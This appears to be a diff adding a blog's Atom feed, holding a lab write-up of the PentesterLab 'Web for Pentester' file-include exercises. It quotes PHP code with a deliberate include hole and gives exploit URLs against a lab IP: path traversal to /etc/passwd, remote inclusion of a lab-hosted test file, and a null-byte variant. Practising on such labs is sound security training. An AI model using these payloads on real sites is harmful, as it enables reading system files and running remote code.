@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: file include | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/file-include/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2016-04-27T15:40:42-05:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Pentestlab-Web for Pentester - File Include]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/16/pentestlab-webforpentester-file-include/"/>
+    <updated>2016-03-16T17:00:22-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/16/pentestlab-webforpentester-file-include</id>
+    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerability</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<p>OWASP:
+The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a &ldquo;dynamic file inclusion&rdquo; mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</p>
+
+<p>Tool: ZAP</p>
+
+<h3>Example 1</h3>
+
+<p>code review:</p>
+
+<pre><code class="php example1.php">    if ($_GET["page"]) {
+        include($_GET["page"]);
+
+    } 
+</code></pre>
+
+<p>The developer uses <code>include</code> function in the code. However, there is no filter to protect file include attack. Use firebug to find the variable name is page, then do exploit:</p>
+
+<p><code>http://192.168.79.162/fileincl/example1.php?page=../../../../../../etc/passwd</code></p>
+
+<p>Also pentesterlab provide a online code <code>https://pentesterlab.com/test_include.txt</code></p>
+
+<p><code>http://192.168.79.162/fileincl/example1.php?page=https://pentesterlab.com/test_include.txt</code></p>
+
+<h3>Example 2</h3>
+
+<p>code review:</p>
+
+<pre><code class="php example2.php">    if ($_GET["page"]) {
+    $file = $_GET["page"].".php";
+    // simulate null byte issue
+    $file = preg_replace('/\x00.*/',"",$file);
+        include($file);
+
+    } 
+</code></pre>
+
+<p>There is a null issue. he null byte character effectively tells the filesystem to ignore anything that comes after it. When the path is resolved by the filesystem</p>
+
+<p>so I can do:</p>
+
+<p><code>http://192.168.79.162/fileincl/example2.php?page=https://pentesterlab.com/test_include.txt%00</code></p>
+]]></content>
+  </entry>
+  
+</feed>
